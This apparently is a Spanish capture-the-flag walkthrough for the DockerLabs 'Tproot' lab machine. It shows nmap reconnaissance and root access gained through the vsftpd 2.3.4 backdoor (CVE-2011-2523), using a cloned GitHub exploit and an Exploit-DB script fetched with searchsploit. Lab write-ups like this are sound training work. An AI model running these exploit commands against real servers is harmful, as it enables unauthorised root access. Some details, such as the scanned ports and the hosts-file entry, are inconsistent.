# 🖥️ **Máquina: Tproot**

- **🔹 Dificultad:** Muy Fácil  
- **📌 Descripción:**  
  Laboratorio diseñado para reforzar habilidades básicas de explotación de servicios mal configurados, enfocado principalmente en **FTP** vulnerable y escalada de privilegios mediante configuración insegura de **sudo**.

- **🎯 Objetivo:**  
  - Explotar la vulnerabilidad en vsftpd 2.3.4 para obtener acceso como root.  
  - Comprender y aplicar diferentes métodos de explotación.  
  - Consolidar buenas prácticas de enumeración y explotación básica.

![Máquina Backend](/Tproot/Imagenes/Plantilla.png)

---

## 🚀 **Despliegue de la Máquina Tproot en DockerLabs**

### 1️⃣ Descargar y descomprimir el archivo

Utilizamos `7z` para extraer el contenido del archivo `.zip`:

```bash
7z e backend.zip
```

### 2️⃣ Ejecutar el despliegue automático

Desplegamos la máquina ejecutando:

```bash
sudo bash auto_deploy.sh tproot.tar
```

📌 **Nota:** Verifica que tengas Docker y 7z correctamente instalados en tu sistema.

### 3️⃣ Comprobar la conexión

Confirmamos que la máquina esté activa mediante un `ping`:

```bash
ping -c4 172.17.0.2
```

![PING](/Tproot/Imagenes/Ping.jpeg)

---

## 🧩 **Fase de Reconocimiento**

Realizamos un escaneo de puertos para identificar servicios activos:

```bash
nmap -p- --open -sS --min-rate 500 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

![Reconocimiento](/Tproot/Imagenes/Escaneo.jpeg)

Posteriormente, enfocamos el escaneo en los puertos detectados:

```bash
nmap -p22,80 -sCV 172.17.0.2 -oN target
```

![Reconocimiento](/Tproot/Imagenes/Servicios.jpeg)

**Servicios detectados:**
- **Puerto 80 (HTTP):** Página web activa.
- **Puerto 21 (FTP):** Servicio FTP.

---

## 🌐 **Acceso a la Página Web**

Editamos el archivo `/etc/hosts` para facilitar el acceso:

```bash
sudo nano /etc/hosts
```

Añadimos:

```plaintext
172.17.0.2
```

Accedemos desde el navegador a `http://172.17.0.2`.

![Pagina](/Tproot/Imagenes/Pagina.jpeg)

Recopilamos información del sitio usando **WhatWeb**:

```bash
whatweb 172.17.0.2
```

---

## 📂 **Explotación del Servicio FTP**

La máquina ejecuta **vsftpd 2.3.4**, vulnerable a una puerta trasera remota.

### Opción 1️⃣ - Clonando un exploit desde GitHub

Buscamos un exploit funcional:

```bash
git clone https://github.com/nobodyatall648/CVE-2011-2523
```

![Reconocimiento](/Tproot/Imagenes/VulGit.jpeg)

Entramos al directorio y ejecutamos el script:

```bash
cd CVE-2011-2523
python3 vsftpd_2.3.4_exploit.py 172.17.0.2
```

![Reconocimiento](/Tproot/Imagenes/GitEje.jpeg)

Así obtenemos un acceso directo como **root**.

---

### Opción 2️⃣ - Usando SearchSploit

Utilizamos **SearchSploit** para encontrar la vulnerabilidad:

```bash
searchsploit vsftpd 2.3.4
```

![FTP_descargas](/Tproot/Imagenes/Herramienta.jpeg)

Descargamos el exploit:

```bash
searchsploit -m unix/remote/49757.py
```

![FTP_descargas](/Tproot/Imagenes/DescargaPy.jpeg)

Ejecutamos el script:

```bash
python3 49757.py 172.17.0.2
```

![FTP_descargas](/Tproot/Imagenes/VulHerr.jpeg)

Con esto también obtenemos acceso como **root**.

---

## 📊 Comparativa de Métodos de Explotación

| Herramienta        | Descripción | Ventajas | Desventajas |
|:-------------------|:------------|:---------|:------------|
| **GitHub (Clonar Exploit)** | Se clona un repositorio donde el exploit ya está probado y documentado. | Rápido, ejemplos funcionales, mejor explicado. | Puede depender de actualizaciones o estar mal mantenido. |
| **SearchSploit (Descargar Exploit)** | Utiliza una base de datos local de exploits para encontrar vulnerabilidades conocidas. | No requiere conexión tras la descarga, acceso organizado. | Puede necesitar ajustes manuales, menor documentación. |

---

## ✅ **Resumen del proceso:**

- Identificamos que el servicio FTP utiliza **vsftpd 2.3.4**, vulnerable a **CVE-2011-2523**.
- Explotamos la vulnerabilidad mediante dos métodos distintos: uno clonando un exploit de GitHub, y otro descargándolo con **SearchSploit**.
- Obtuvimos acceso **root** sin requerir técnicas de escalada de privilegios adicionales.
- Consolidamos conocimientos en escaneo, reconocimiento, explotación básica y herramientas de explotación.
